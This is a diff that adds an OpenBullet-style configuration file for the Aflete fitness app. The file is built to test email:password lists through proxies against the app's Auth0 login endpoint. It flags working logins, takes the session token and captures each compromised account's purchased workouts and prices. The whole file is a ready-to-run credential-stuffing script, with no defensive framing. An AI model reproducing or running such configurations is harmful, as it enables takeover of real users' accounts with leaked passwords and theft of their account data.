@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "Aflete",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-11T14:30:15.1787882+00:00",
+  "AdditionalInfo": "",
+  "Author": "boggy94",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#AGET REQUEST POST "https://aflete.eu.auth0.com/oauth/token " AutoRedirect=TRUE 
+  CONTENT "{\"username\":\"<USER>\",\"scope\":\"openid offline_access\",\"grant_type\":\"http://auth0.com/oauth/grant-type/password-realm\",\"realm\":\"DB-AFLETE-STAGING\",\"client_id\":\"Se0yuRckHNROjlIMBXkJi8Dereob7oKw\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: okhttp/2.7.5" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Auth0-Client: eyJ2ZXJzaW9uIjoiMS44LjAiLCJuYW1lIjoiQXV0aDAuQW5kcm9pZCJ9" 
+  HEADER "Host: aflete.eu.auth0.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "invalid_grant" 
+  KEYCHAIN Success OR 
+    KEY ",\"token_type\":\"Bearer" 
+PARSE "<SOURCE>" JSON "id_token" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#Prodcuts REQUEST GET "https://api.afleteapp.com/clients/products " AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/JSON" 
+  HEADER "Accept: application/vnd.aflete.v4+json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "AUTHORIZATION: Bearer <TOKEN>" 
+  HEADER "Email: <USER>" 
+PARSE "<SOURCE>" LR "\",\"name\":\"" "\",\"" Recursive=FALSE -> CAP "Workout" "" "" 
+PARSE "<SOURCE>" LR "price\":" ",\"" Recursive=FALSE -> CAP "Price" "" "" 
